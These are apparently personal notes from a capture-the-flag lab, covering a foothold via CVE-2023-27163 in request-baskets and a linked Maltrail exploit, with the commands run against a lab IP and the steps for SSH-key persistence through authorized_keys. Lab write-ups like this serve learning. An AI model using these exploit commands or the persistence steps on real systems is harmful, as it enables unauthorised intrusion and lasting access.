## Foothold
- Web server is running a vulnerable version of `request-baskets` which can be exploited with [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)
	- Exploit was successfully ran with both commands:
		- `./CVE-2023-27163.sh http://10.129.63.175:55555/ http://127.0.0.1:80`
		- `./CVE-2023-27163.sh http://10.129.63.175:55555/ http://127.0.0.1:8338`
- The newly discovered web server is running a vulnerable version of `Maltrail` which can be exploited with https://github.com/spookier/Maltrail-v0.53-Exploit
- Once exploited, the user flag can be obtained and persistence can be established through:
	- `mkdir -m 700 ~/.ssh`
	- Copy your `id_rsa.pub` key
	- `echo 'your_public_key' >> ~/.ssh/authorized_keys`
![](Attachments/Pasted%20image%2020231108201224.png)